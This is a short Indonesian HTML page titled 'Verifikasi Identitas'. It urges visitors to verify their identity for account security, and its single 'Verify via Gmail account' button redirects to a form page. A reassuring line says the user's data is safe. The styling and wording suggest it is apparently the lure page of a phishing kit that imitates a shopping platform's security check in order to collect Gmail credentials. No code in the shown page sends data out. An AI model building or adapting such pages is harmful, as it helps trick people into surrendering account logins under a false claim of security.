<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Identitas</title>
    <!-- Gaya CSS (dapat ditempatkan di sini atau di file eksternal) -->
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f8f8f8;
            color: #333;
        }

        .container {
            max-width: 480px;
            margin: 20px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        h1 {
            font-size: 1.5em;
            margin-bottom: 10px;
        }

        p {
            font-size: 1em;
            margin-bottom: 20px;
        }

        .verification-option {
            margin-bottom: 15px;
        }

        .verification-option button {
            width: 100%;
            padding: 10px;
            font-size: 1em;
            background-color: #ee4d2d;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .verification-option button:hover {
            background-color: #d0371a;
        }

        .security {
            margin-top: 20px;
            font-size: 0.8em;
            color: #777;
        }
    </style>
    <script>
        function goToFormulir() {
            window.location.href = "formulir.html";
        }
    </script>
</head>

<body class="bg-white text-black min-h-screen">
    <div class="container">
        <h1>Verifikasi Identitas</h1>
        <p>Untuk meningkatkan keamanan akun Anda, mohon verifikasi identitas Anda.</p>

        <div class="verification-option">
            <button onclick="goToFormulir()">Verifikasi melalui Akun Gmail</button>
        </div>

        <div class="security">
            Data Anda aman dan terlindungi.
        </div>
    </div>
</body>

</html>
